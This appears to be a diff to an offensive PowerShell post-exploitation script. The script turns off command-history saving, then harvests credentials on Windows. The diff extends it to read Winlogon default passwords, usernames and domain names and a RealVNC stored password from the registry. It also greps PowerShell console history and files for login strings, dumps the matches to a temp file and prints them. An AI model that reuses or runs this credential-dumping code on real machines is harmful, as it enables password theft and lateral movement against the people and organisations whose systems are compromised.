@@ -70,27 +70,29 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         }
 
         ## Checking Registry for winlogon credentials
-        Write-Host "`nScanning registry for winlogon creds!" -ForegroundColor Green;Start-Sleep -Seconds 1
         $RawKKLMKey = "HKLM:\SOFTWARE\Microsoft\" + "Windows NT\CurrentVersion\Winlogon" -Join ''
-        $WinLogOnPass = (Get-Itemproperty -path "$RawKKLMKey").DefaulPassword
-        $WinLogOnName = (Get-Itemproperty -path "$RawKKLMKey").LastUsedUsername
-        If($WinLogOnName -ne $null -or $WinLogOnPass -ne $null){
-            Write-Host "------------------------------------"
-            Write-Host "Username    : $WinLogOnName"
-            Write-Host "Password    : $WinLogOnPass"
-        }Else{## None Default Password value found in regedit
-            Write-Host "[error] none credentials found under regedit!" -ForegroundColor Red -BackgroundColor Black
-        }
+        $WinLogOnPass = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).DefaulPassword
+        $WinLogOnName = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).LastUsedUsername
+        $DefaultDName = (Get-Itemproperty -path "$RawKKLMKey" -EA SilentlyContinue).DefaultDomainName
+        $RealVnc = $(Get-Itemproperty -path "HKLM:\SOFTWARE\RealVNC\WinVNC4" -EA SilentlyContinue).password
+
+        ## Build Output Table
+        Write-Host "`nScanning registry for winlogon creds!" -ForegroundColor Green
+        Write-Host "-------------------------------------";Start-Sleep -Seconds 1
+        Write-Host "Username    : $WinLogOnName"
+        Write-Host "DomainName  : $DefaultDName"
+        Write-Host "Password    : $WinLogOnPass"
+        Write-Host "RealVNC Pass: $RealVnc"
 
         ## Checking ConsoleHost_History for credentials
         Write-Host "`nScanning ConsoleHost_History for creds!" -ForegroundColor Green;Start-Sleep -Seconds 1
         $PSHistory = "$Env:APPDATA\Microsoft\Windows\" + "PowerShell\PSReadLine\ConsoleHost_History.txt" -Join ''
         $Credentials = Get-Content -Path "$PSHistory"|
-            Select-String -pattern "user:","pass:","username:","passw:","passwd:","password:","login:","logon:"
+            Select-String -pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:"
         If(-not($Credentials) -or $Credentials -eq $null){## Make sure we have any creds returned
             Write-Host "[error] None Credentials found under ConsoleHost_History!" -ForegroundColor Red -BackgroundColor Black
         }Else{## Credentials found
-            Write-Host "------------------------------------"
+            Write-Host "-------------------------------------"
             ForEach($token in $Credentials){# Loop in each string found
                 Write-Host "$token"
             }
@@ -109,11 +111,11 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
          
            ForEach($Item in $dAtAbAsEList){## Search in $dAtAbAsEList for login strings
               Get-Content -Path "$Item" -EA SilentlyContinue -Force|
-              Select-String -Pattern "user:","pass:","username:","passw:","passwd:","password:","login:","logon:" >> $Env:TMP\passwd.txt
+              Select-String -Pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:" >> $Env:TMP\passwd.txt
            }
 
            $ChekCreds = Get-Content -Path "$Env:TMP\passwd.txt" -EA SilentlyContinue|
-               Select-String -pattern "user:","pass:","username:","passw:","passwd:","password:","login:","logon:"|
+               Select-String -pattern "user:","pass:","username:","pwd:","passw:","passwd:","password:","login:","logon:"|
                findstr /V "S E R V I C E"|findstr /V "if self.username:"|findstr /V "#"|? {$_.trim() -ne ""}
            If($ChekCreds -ieq $null){## None credentials found
               Write-Host "[error] None credentials found under $StartDir!" -ForegroundColor Red -BackgroundColor Black
